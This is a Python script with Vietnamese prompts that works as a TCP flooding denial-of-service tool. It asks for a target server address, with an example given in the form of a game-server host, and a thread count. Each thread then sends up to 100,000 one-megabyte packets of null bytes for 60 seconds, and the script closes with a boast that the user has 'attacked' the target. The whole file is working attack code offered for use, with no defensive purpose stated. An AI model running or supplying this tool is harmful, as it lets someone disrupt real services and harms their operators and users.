import socket
import threading
import time
import os
from datetime import datetime, timedelta


def send_packet(server_ip, server_port, packet, packet_count, thread_id, stop_event):
    """Send packets to the specified server."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(3)
            s.connect((server_ip, server_port))
            for i in range(packet_count):
                if stop_event.is_set():
                    break
                s.sendall(packet)
                print(f"[Thread {thread_id}] badat2206 đã tham gia O_o ({i + 1}/{packet_count})")
    except Exception as e:
        print(f"[Thread {thread_id}] Lỗi: {e}")

def stop_after_timeout(stop_event, timeout=60):
    """Stop packet sending after a timeout (default 60 seconds)."""
    time.sleep(timeout)
    stop_event.set()
    print("\n⛔ Dừng gửi sau 60 giây.")

def main():
    try:
        # Get server address from user
        server_address = input("Nhập IP server (vd: gold6.asaka.asia:25080): ")
        if ":" not in server_address:
            raise ValueError("Sai định dạng dạng ip:port")
        server_ip, server_port = server_address.split(":")
        server_port = int(server_port)

        # Create a 1MB packet of null bytes
        packet = b"\x00" * (1 * 1024 * 1024)  # 1MB packet
        packet_count = 100000

        # Get number of threads from user
        thread_count = int(input("Nhập số luồng: "))

        # Create stop event and start timeout thread
        stop_event = threading.Event()
        timer_thread = threading.Thread(target=stop_after_timeout, args=(stop_event,))
        timer_thread.start()

        # Start packet-sending threads
        threads = []
        for i in range(thread_count):
            t = threading.Thread(
                target=send_packet,
                args=(server_ip, server_port, packet, packet_count, i + 1, stop_event)
            )
            threads.append(t)
            t.start()

        # Wait for all threads to complete
        for t in threads:
            t.join()

        print("✅ badat2206 đã tàn công !!!")

    except Exception as e:
        print(f"Lỗi: {e}")

if __name__ == "__main__":
    main()
